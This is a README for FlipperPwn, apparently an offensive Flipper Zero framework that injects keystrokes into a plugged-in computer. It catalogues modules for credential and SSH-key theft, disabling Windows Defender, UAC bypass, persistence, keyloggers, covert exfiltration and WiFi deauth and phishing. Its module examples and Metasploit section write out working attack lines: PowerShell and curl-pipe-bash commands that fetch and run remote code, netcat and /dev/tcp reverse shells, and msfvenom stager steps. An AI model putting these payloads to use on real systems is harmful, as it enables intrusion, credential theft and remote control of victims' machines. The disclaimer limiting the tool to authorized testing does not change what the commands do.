# FlipperPwn

```
 _____ _ _                 ____
|  ___| (_)_ __  _ __   _|  _ \__      ___ __
| |_  | | | '_ \| '_ \ / _ \ \ \ /\ / / '_ \
|  _| | | | |_) | |_) |  __/  \ V  V /| | | |
|_|   |_|_| .__/| .__/ \___|___\_/\_/ |_| |_|
          |_|   |_|        |_____|
```

**Modular pentest payload framework for Flipper Zero**

[![Platform](https://img.shields.io/badge/platform-Flipper%20Zero-orange)](https://flipperzero.one)
[![Firmware](https://img.shields.io/badge/firmware-1.4.3-blue)](https://github.com/flipperdevices/flipperzero-firmware)
[![API](https://img.shields.io/badge/API-87.1-green)](https://github.com/flipperdevices/flipperzero-firmware)
[![Category](https://img.shields.io/badge/category-USB-yellow)](.)

---

FlipperPwn is a Metasploit-inspired payload framework (v1.5) that turns Flipper Zero into a full USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. 43 built-in modules span recon, credential capture, exploitation, and post-exploitation. The scripting engine supports 80+ DuckyScript-compatible commands including variables with arithmetic, FOR/WHILE loops, IF/ELSE/ENDIF conditionals, INJECT for modular composition, PLATFORM ALL universal sections, mouse HID automation, OS-aware convenience commands (OPEN_TERMINAL, LOCK_SCREEN, SCREENSHOT, clipboard operations), Run Last quick-run, **dual exfiltration channels** (LED covert channel at ~33 bps and USB CDC serial at ~115200 baud), WiFi+HID combined attacks, random payload generation, LED heartbeat during execution, and per-character typing delays for evasion. Optional ESP32 WiFi Dev Board integration adds network scanning, targeted deauth, evil portal credential phishing, PMKID capture, and station enumeration.

> **This tool is for authorized security testing only. See the [Legal Disclaimer](#legal-disclaimer).**

---

## Table of Contents

- [How It Works](#how-it-works)
- [OS Detection](#os-detection)
- [WiFi Dev Board Integration](#wifi-dev-board-integration)
- [Exfiltration Channels](#exfiltration-channels)
- [Built-in Modules](#built-in-modules)
- [Module Format (.fpwn)](#module-format-fpwn)
- [Metasploit Integration](#metasploit-integration)
- [Installation](#installation)
- [WiFi Dev Board Setup](#wifi-dev-board-setup)
- [Legal Disclaimer](#legal-disclaimer)

---

## How It Works

```
  [ Flipper Zero ] ──USB HID──► [ Target Machine ]
        │                              │
        │   1. Enumerate as keyboard   │
        │   2. Run OS detection        │
        │   3. Select .fpwn module     │
        │   4. Configure options       │
        │   5. Execute payload ───────►│ (keystrokes)
        │                              │
        │◄── Live progress on screen ──│
```

**Attack chain:**

1. Plug Flipper Zero into the target machine via USB-C.
2. The Flipper enumerates as a standard USB HID keyboard — no driver installation required.
3. OS detection runs automatically (or you set it manually from the options menu).
4. Browse modules by category: **Recon**, **Credentials**, **Exploit**, **Post-Exploit**.
5. Select a module, review and edit its options (e.g., `LHOST`, `LPORT`).
6. Execute: the payload opens the appropriate terminal/dialog for the detected OS, types the commands, and establishes access.
7. Progress is shown live on the Flipper screen. Press **Back** at any time to abort.

Up to **32 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.

---

## OS Detection

FlipperPwn uses a three-phase USB HID LED heuristic to fingerprint the target OS without sending any visible keystrokes to the screen.

```
Phase 0 — CapsLock probe (connectivity check)
  Toggle CapsLock → wait 50ms → check LED feedback
  No response? → OS Unknown (abort, USB HID not active)

Phase 1 — NumLock probe (macOS discriminator)
  Toggle NumLock → wait 100ms → check NumLock LED
  No change? → macOS (ignores NumLock on external keyboards)

Phase 2 — ScrollLock probe (Windows vs. Linux)
  Toggle ScrollLock → wait 100ms → check ScrollLock LED
  Changed? → Windows (maintains ScrollLock LED state)
  No change? → Linux (X11/Wayland do not propagate ScrollLock)
```

All toggled LEDs are restored to their original state after probing, leaving the target's keyboard indicator lights unchanged.

You can override auto-detection and manually force **Windows**, **macOS**, or **Linux** from the options screen — useful when a corporate keyboard policy suppresses LED feedback.

---

## WiFi Dev Board Integration

FlipperPwn supports the **ESP32 WiFi Dev Board** running [WiFi Marauder](https://github.com/justcallmekoko/ESP32Marauder) firmware for network-layer attacks alongside HID injection.

**Connection:** USART1 — GPIO pin 13 (TX), GPIO 14 (RX), 115200 baud

The app auto-detects the ESP32 on startup. WiFi features are greyed out if no board is present.

| WiFi Command | Description |
|---|---|
| `WIFI_SCAN` | Scan for nearby APs (SSID, RSSI, channel, encryption) |
| `WIFI_JOIN` | Connect ESP32 to a target network |
| `WIFI_DEAUTH` | Deauthentication attack against a target AP or client |
| `WIFI_RESULT` | Type the last WiFi scan result via HID into a text field |
| `WIFI_WAIT` | Wait for an async WiFi operation to complete |
| `PING_SCAN` | Discover live hosts on the joined network |
| `PORT_SCAN` | Scan a host for open ports |

Mixed HID + WiFi modules are supported: a single `.fpwn` file can scan nearby networks, join one, sweep for hosts, and type the results into a document — all sequentially.

---

## Exfiltration Channels

FlipperPwn supports two data exfiltration channels for getting command output back from the target to the Flipper:

### LED Covert Channel (`EXFIL`)

The original channel encodes data bit-by-bit using CapsLock (data) and NumLock (clock) LED toggling. The Flipper reads `furi_hal_hid_get_led_state()` at 2 ms intervals. **~33 bits/sec** — slow but requires no driver support and works while the Flipper stays in HID mode.

### USB CDC Serial Channel (`EXFIL_USB`)

**New in v1.5.** High-bandwidth exfiltration via USB CDC virtual serial port at **~115200 baud** — roughly 3400x faster than LED toggling.

**How it works:**

1. **HID Phase:** FlipperPwn types an OS-specific script via HID that runs your command, buffers the output, and polls for a new serial port to appear
2. **Baked-in Delay:** A configurable pause (default 5s) lets the script run and snapshot existing serial ports
3. **USB Switch:** Flipper switches from HID to CDC — the target sees a new COM/ttyACM device
4. **Data Transfer:** The target script finds the new serial port and writes the buffered data + EOT marker
5. **Restore:** Flipper switches back to HID mode for continued payload execution

**Configurable variables:**

| Variable | Default | Description |
|---|---|---|
| `EXFIL_USB_DELAY` | 5000 | Milliseconds to wait before USB switch (min 1000, max 30000) |
| `EXFIL_USB_TIMEOUT` | 20000 | Receive timeout in milliseconds (min 5000, max 60000) |

**Example module snippet:**
```
SET EXFIL_USB_DELAY 5000
EXFIL_USB hostname
```

Data is saved to `SD:/flipperpwn/exfil/exfil_usb_<timestamp>.txt` and appended to the run log.

---

## Built-in Modules

41 modules ship with FlipperPwn, organized into four categories.

### Recon

| Module | Description |
|---|---|
| `System Info Recon` | Dump OS version, hostname, CPU architecture, and current user |
| `Network Recon` | Print active network interfaces, IPs, and routing table |
| `Full Recon Suite` | Combined system, network, and process enumeration in one pass |
| `Stealth Recon` | Low-noise recon using living-off-the-land binaries to avoid EDR |
| `WiFi Recon Full` | Extract saved WiFi profiles and plaintext PSKs from the OS |
| `OS Fingerprint Script` | LED-heuristic OS probe with result typed into an open text field |
| `Conditional Recon` | Runs different recon based on variable mode selection |
| `Quick Recon` | Fast recon using OPEN_TERMINAL and PLATFORM ALL |
| `Exfil Hostname` | Silently exfiltrates hostname via LED covert channel |
| `Countdown Timer` | Demo of variable arithmetic and WHILE loops |
| `User Enumeration` | Enumerate common user directories using FOR loop |
| `Port Sequence` | Scan well-known ports using variable arithmetic |

### Credentials

| Module | Description |
|---|---|
| `WiFi Credential Dump` | Extract plaintext WiFi PSKs from the OS credential store (LED) |
| `WiFi Creds (USB)` | Extract plaintext WiFi PSKs via USB CDC serial (high-bandwidth) |
| `USB Exfil Test` | Simple hostname exfil to verify the USB CDC pipeline |
| `Hash Dump` | Invoke credential harvesting to capture NTLM / shadow hashes |
| `Browser History Dump` | Read and type browser history from common profile paths |
| `Clipboard Dump` | Read and exfiltrate the current clipboard contents |
| `SSH Key Dump` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
| `Evil Portal Phish` | Start an ESP32 evil portal captive page and capture credentials |
| `SAM Hash Dump` | Exports SAM/SYSTEM hives for offline cracking - Windows only |
| `PIN Spray` | Tries common 4-digit PINs using FOR loop |

### Exploit

| Module | Description |
|---|---|
| `Attack Chain` | Full multi-stage attack: recon → privilege escalation → persistence |
| `Reverse Shell` | Establish a reverse TCP shell back to a netcat listener |
| `Disable Defenses` | Disable Windows Defender and common EDR services via PowerShell |
| `WiFi Attack Chain` | Scan → deauth → capture PMKID → type results via HID |
| `Rickroll Beacon` | Spam fake SSIDs and open browser to rickroll URL on target |
| `UAC Bypass RunAs` | UAC bypass via RunAs auto-elevation vector (Windows) |
| `Payload Dropper` | Download and execute a remote binary via PowerShell / curl / wget |
| `Screen Capture` | Takes screenshot using OS-native tools |
| `Screen Grab` | Minimize windows, screenshot desktop, restore |
| `Modular Payload Chain` | Chains multiple modules together via INJECT |
| `USB Wait Deploy` | Dead drop: waits for USB then runs command |
| `Stealth Typer` | Types commands with per-char delays to evade detection |
| `Phish Redirect` | Opens a phishing URL in the target's browser |
| `WiFi Full Attack` | Full WiFi chain: scan → deauth → PMKID → save results |

### Post-Exploit

| Module | Description |
|---|---|
| `Lock Screen` | Immediately lock the target workstation |
| `Lock and Leave` | Run recon then lock the workstation |
| `Persistence Install` | Drop a startup entry (registry / launchd / systemd user unit) |
| `Keylogger Install` | Install a keystroke logger and configure exfiltration |
| `Random Password Gen` | Generate and type a cryptographically random password |
| `Mouse Jiggler` | Keeps screen awake via mouse movement - PLATFORM ALL |
| `Quick Exfil` | Exfil system info to file via PowerShell |

---

## Module Format (.fpwn)

Modules are plain-text files with a `.fpwn` extension. They live on the SD card under `/ext/flipperpwn/modules/` and can be organized into subdirectories.

### File Structure

```
# Lines starting with # are comments
NAME        module_name
DESCRIPTION One-line description of what this module does
CATEGORY    recon|credential|exploit|post
PLATFORMS   WIN,MAC,LINUX

OPTION LHOST 10.0.0.1 "Attacker IP address"
OPTION LPORT 4444     "Attacker listening port"
OPTION DELAY 1500     "Post-open delay in ms"

PLATFORM WIN
  DELAY 500
  GUI r
  DELAY {{DELAY}}
  STRING powershell -w h -nop -ep bypass -c "iex (iwr http://{{LHOST}}/s.ps1)"
  ENTER

PLATFORM MAC
  DELAY 500
  COMMAND SPACE
  DELAY 300
  STRING terminal
  ENTER
  DELAY {{DELAY}}
  STRING curl -s http://{{LHOST}}/s.sh | bash
  ENTER

PLATFORM LINUX
  DELAY 500
  CTRL ALT t
  DELAY {{DELAY}}
  STRING curl -s http://{{LHOST}}/s.sh | bash
  ENTER
```

### Headers

| Field | Values | Required |
|---|---|---|
| `NAME` | Identifier string | Yes |
| `DESCRIPTION` | Human-readable summary | No |
| `CATEGORY` | `recon`, `credential`, `exploit`, `post` | No (defaults to `recon`) |
| `PLATFORMS` | Comma-separated: `WIN`, `MAC`, `LINUX` | No (all platforms) |

### Options

```
OPTION <NAME> <default_value> "<description>"
```

Options are editable from the Flipper menu before execution. Reference them in payload lines as `{{NAME}}`:

```
OPTION LHOST 192.168.1.100 "Listener IP"
STRING nc {{LHOST}} {{LPORT}} -e /bin/bash
```

Up to **4 options** per module. Names are case-sensitive.

### Platform Sections

Each `PLATFORM <TAG>` line begins a block of commands executed only on the matching OS. Sections end at the next `PLATFORM` line or EOF. Indentation is optional but recommended for readability.

Supported tags: `WIN`, `MAC`, `LINUX`, `ALL`

Use `PLATFORM ALL` for OS-independent commands. If no OS-specific section exists, the engine falls back to `PLATFORM ALL`.

### Command Reference

#### Text and Timing

| Command | Effect |
|---|---|
| `STRING <text>` | Type text character-by-character via HID. Supports full ASCII including punctuation. |
| `DELAY <ms>` | Pause for the specified number of milliseconds. |

#### Navigation Keys

| Command | Key Sent |
|---|---|
| `ENTER` / `RETURN` | Return |
| `TAB` | Tab |
| `ESCAPE` / `ESC` | Escape |
| `BACKSPACE` | Backspace |
| `DELETE` | Forward delete |
| `HOME` | Home |
| `END` | End |
| `PAGEUP` | Page Up |
| `PAGEDOWN` | Page Down |
| `UP` / `DOWN` / `LEFT` / `RIGHT` | Arrow keys |

#### Function Keys

`F1` through `F12` — type the bare key name on its own line.

#### Modifier Combos

| Command | Keys Sent |
|---|---|
| `GUI <key>` / `WINDOWS <key>` / `COMMAND <key>` | Win/Cmd + key |
| `CTRL <key>` | Ctrl + key |
| `ALT <key>` | Alt + key |
| `SHIFT <key>` | Shift + key |
| `CTRL ALT <key>` | Ctrl + Alt + key |

`<key>` can be a single letter, a named key (`ENTER`, `TAB`, `F5`, `SPACE`, etc.), or an arrow key name.

#### Extended Text Commands

| Command | Effect |
|---|---|
| `STRINGLN <text>` | Type text then press Enter |
| `STRING_DELAY <ms> <text>` | Type with per-character delay |
| `STRINGLN_DELAY <ms> <text>` | Type with per-character delay then press Enter |

#### Key Hold/Release

| Command | Effect |
|---|---|
| `HOLD <key>` | Hold a key or modifier down |
| `RELEASE <key>` | Release a specific held key |
| `RELEASE` | Release all held keys |

#### LED State Commands

| Command | Effect |
|---|---|
| `LED` | Flash green LED |
| `LED_COLOR <color>` | Flash LED in RED/GREEN/BLUE/YELLOW/CYAN/MAGENTA |
| `WAIT_FOR_CAPS_ON` | Wait until CapsLock LED is on (30s timeout) |
| `WAIT_FOR_CAPS_OFF` | Wait until CapsLock LED is off |
| `WAIT_FOR_NUM_ON` | Wait until NumLock LED is on |
| `WAIT_FOR_NUM_OFF` | Wait until NumLock LED is off |

#### Timing and Flow Control

| Command | Effect |
|---|---|
| `DELAY <ms>` / `SLEEP <ms>` | Pause for milliseconds |
| `DEFAULTDELAY <ms>` | Set default delay between all commands |
| `JITTER <min> <max>` | Random delay for anti-detection |
| `WAIT_BUTTON` | Pause until user presses OK on Flipper |
| `WAIT_FOR_USB` | Wait until USB HID is connected (30s timeout) |
| `REPEAT <n>` | Repeat the previous command n times |
| `REPEAT_BLOCK <n>` / `END_REPEAT` | Loop a block of commands n times |
| `FOR $VAR = start TO end` / `END_FOR` | Counted loop (supports ascending and descending) |
| `WHILE $VAR == value` / `END_WHILE` | Loop while condition is true (max 1000 iterations) |
| `IF_CONNECTED` / `END_IF` | Conditional: skip block if no ESP32 |
| `IF $VAR == value` / `ELSE` / `END_IF` | Conditional: execute block based on variable comparison (supports == and !=) |

#### Variables

| Command | Effect |
|---|---|
| `VAR $name = value` | Define a runtime variable |
| `SET $name = value` | Set/update a runtime variable |
| `VAR $X = $X + 1` | Arithmetic: supports +, -, *, /, % operators |
| Reference with `$name` in STRING/STRINGLN |

#### OS-Aware Convenience Commands

| Command | Effect |
|---|---|
| `OPEN_TERMINAL` | Open terminal (cmd / Terminal.app / Ctrl+Alt+T) |
| `OPEN_POWERSHELL` | Open PowerShell (Win) or admin shell (others) |
| `OPEN_BROWSER` | Open default browser |
| `MINIMIZE_ALL` | Minimize all windows (Win+D / Cmd+H+M / Super+D) |
| `LOCK_SCREEN` | Lock workstation (Win+L / Ctrl+Cmd+Q / Super+L) |
| `SCREENSHOT` | Take screenshot (Win+Shift+S / Cmd+Shift+3 / PrintScreen) |
| `CLOSE_WINDOW` | Close active window (Alt+F4 / Cmd+W) |
| `TASK_MANAGER` | Open task manager/activity monitor |
| `SELECT_ALL` | Select all (Ctrl+A / Cmd+A) |
| `COPY` / `CUT` / `PASTE` | Clipboard operations (OS-aware modifier) |
| `UNDO` / `REDO` | Undo/redo (OS-aware modifier) |
| `FIND` | Open find dialog (Ctrl+F / Cmd+F) |
| `SAVE` | Save (Ctrl+S / Cmd+S) |
| `BROWSE_URL <url>` | Open a specific URL in the default browser |
| `OPEN_NOTEPAD` | Open text editor (Notepad / TextEdit / gedit) |
| `PRINT <text>` | Display message on Flipper screen during execution |

#### Mouse HID Commands

| Command | Effect |
|---|---|
| `MOUSE_MOVE <dx> <dy>` | Move mouse by delta (-127 to 127) |
| `MOUSE_CLICK [LEFT\|RIGHT\|MIDDLE]` | Click and release (default LEFT) |
| `MOUSE_PRESS [LEFT\|RIGHT\|MIDDLE]` | Press without releasing (for drag) |
| `MOUSE_RELEASE [LEFT\|RIGHT\|MIDDLE]` | Release a held button |
| `MOUSE_SCROLL <delta>` | Scroll wheel (-127 to 127) |

#### Module Composition

| Command | Effect |
|---|---|
| `INJECT <filename>` | Execute another .fpwn file inline (max depth 4) |

#### Random Generation

| Command | Effect |
|---|---|
| `RANDOM_STRING <length>` | Type random alphanumeric chars (max 64) |
| `RANDOM_INT <min> <max>` | Type a random integer |

#### Special Commands

| Command | Effect |
|---|---|
| `ALTCODE <code>` | Type via Windows ALT+numpad entry |
| `SYSRQ <key>` | Linux Magic SysRq key combo |
| `TYPE_FILE <filename>` | Type contents of SD card file as keystrokes |

#### Data Exfiltration

| Command | Effect |
|---|---|
| `EXFIL <command>` | Run command, exfil output via CapsLock/NumLock LED toggling (~33 bps) |
| `EXFIL_USB <command>` | Run command, exfil output via USB CDC serial (~115200 baud) |

#### WiFi Commands (requires ESP32)

| Command | Description |
|---|---|
| `WIFI_SCAN` | Trigger an AP scan on the ESP32 |
| `WIFI_JOIN <ssid> <pass>` | Connect to a network |
| `WIFI_DEAUTH <bssid>` | Send deauth frames to target AP |
| `WIFI_DEAUTH_TARGET <SSID>` | Targeted deauth against specific AP |
| `WIFI_BEACON` | Beacon spam (fake SSIDs) |
| `WIFI_PORTAL <SSID>` | Start evil portal captive page |
| `WIFI_SNIFF_PMKID` | Capture PMKID handshakes |
| `WIFI_HANDSHAKE` | WPA handshake capture via deauth |
| `WIFI_SCAN_STA` | Scan associated client stations |
| `WIFI_PROBE <ms>` | Sniff probe requests |
| `WIFI_STA_RESULT` | Type station scan results as keystrokes |
| `WIFI_STOP` | Stop any active WiFi operation |
| `SAVE_WIFI` | Save all WiFi results to SD card |
| `PING_SCAN <subnet>` | ICMP sweep (e.g., `192.168.1.0/24`) |
| `PORT_SCAN <host>` | TCP connect scan on common ports |
| `WIFI_RESULT` | Type the last scan result as HID keystrokes |
| `WIFI_WAIT <ms>` | Wait for an async WiFi operation |

---

## Metasploit Integration

FlipperPwn's `msfvenom_stager` module and the `reverse_shell_tcp` / `reverse_shell_dns` modules are designed to work directly with Metasploit Framework.

### Meterpreter Stager Flow

**1. Generate the stager on your attacking machine:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<your-IP> LPORT=4444 \
  -f exe -o /var/www/html/stager.exe
```

**2. Start a handler:**

```bash
msfconsole -q -x "
  use exploit/multi/handler;
  set payload windows/x64/meterpreter/reverse_tcp;
  set LHOST <your-IP>;
  set LPORT 4444;
  set ExitOnSession false;
  exploit -j
"
```

**3. On Flipper:** Select `msfvenom_stager`, set `LHOST` to your IP and `LPORT` to `4444`.

The module will open a hidden PowerShell window, download `stager.exe` from `http://{{LHOST}}/stager.exe`, and execute it — triggering a meterpreter callback.

### Reverse Shell (netcat)

For the `reverse_shell_tcp` module, listen with:

```bash
nc -lvnp 4444
```

Set `LHOST` and `LPORT` to match on the Flipper before executing.

### Linux/macOS Reverse Shell

```bash
nc -lvnp 4444   # or: ncat --broker -l 4444
```

The `PLATFORM LINUX` and `PLATFORM MAC` sections open a terminal, run `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`, and connect back.

---

## Installation

### Requirements

- Flipper Zero with firmware **1.4.3** (API 87.1)
- [ufbt](https://github.com/flipperdevices/flipperzero-ufbt) 0.2.6+
- SD card formatted and inserted in the Flipper

### Build and Deploy

```bash
cd flipperpwn
ufbt
```

This produces `dist/flipperpwn.fap`.

**Copy to SD card:**

```
dist/flipperpwn.fap  →  /ext/apps/USB/flipperpwn.fap
```

**Copy modules to SD card:**

```
flipperpwn_modules/  →  /ext/flipperpwn/modules/
```

The app will also load custom `.fpwn` files you drop directly into `/ext/flipperpwn/modules/` — no rebuild required.

**SD card layout:**

```
/ext/
├── apps/
│   └── USB/
│       └── flipperpwn.fap
└── flipperpwn/
    └── modules/
        ├── recon/
        │   ├── sys_info.fpwn
        │   └── ...
        ├── exploit/
        │   ├── reverse_shell_tcp.fpwn
        │   └── ...
        └── my_custom_module.fpwn
```

> Modules are discovered recursively. Subdirectory names have no semantic effect — only the `CATEGORY` header in each file determines where the module appears in the menu.

---

## WiFi Dev Board Setup

**Hardware required:** [Flipper Zero WiFi Dev Board](https://shop.flipperzero.one/products/wifi-devboard) (ESP32-S2) flashed with [WiFi Marauder](https://github.com/justcallmekoko/ESP32Marauder).

1. Flash WiFi Marauder firmware onto the ESP32 Dev Board.
2. Connect the board to Flipper Zero via the GPIO header.
3. Verify connections:

   | Flipper GPIO | ESP32 | Signal |
   |---|---|---|
   | Pin 13 | TX | USART1 TX |
   | Pin 14 | RX | USART1 RX |
   | 3V3 or 5V | VIN | Power |
   | GND | GND | Ground |

4. Power the Flipper. On app start, FlipperPwn probes the USART at **115200 baud**. If the ESP32 responds to the Marauder handshake, WiFi module commands become available.

WiFi functionality is disabled automatically when no board is detected — HID-only modules work regardless.

---

## Writing Custom Modules

The `.fpwn` format is intentionally simple. A minimal working module:

```
NAME my_payload
DESCRIPTION Opens notepad and types a message
CATEGORY recon
PLATFORMS WIN

PLATFORM WIN
  DELAY 500
  GUI r
  DELAY 300
  STRING notepad
  ENTER
  DELAY 800
  STRING Hello from FlipperPwn
  ENTER
```

Save it as `my_payload.fpwn` and drop it anywhere under `/ext/flipperpwn/modules/`. It will appear in the menu on next launch.

**Tips:**
- Add `DELAY` after `GUI r` and `ENTER` — the Run dialog and terminal emulators need time to open.
- Use `OPTION` for any value you expect to change between engagements (IPs, ports, usernames, filenames).
- The `PLATFORM` block matching the detected OS is the only one executed; others are parsed but skipped.
- Comments (`#`) are supported anywhere in the file.

---

## Legal Disclaimer

FlipperPwn is provided for **authorized security testing, research, and educational purposes only**.

Using this tool against systems you do not own or do not have explicit written permission to test is **illegal** under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent laws in most jurisdictions worldwide.

The authors and contributors of this project:
- Accept no liability for misuse or damage caused by this software
- Do not endorse or encourage illegal activity of any kind
- Provide this software as-is, without warranty of any kind

**You are solely responsible for ensuring your use of FlipperPwn complies with all applicable laws and regulations. Always obtain proper authorization before conducting any security test.**
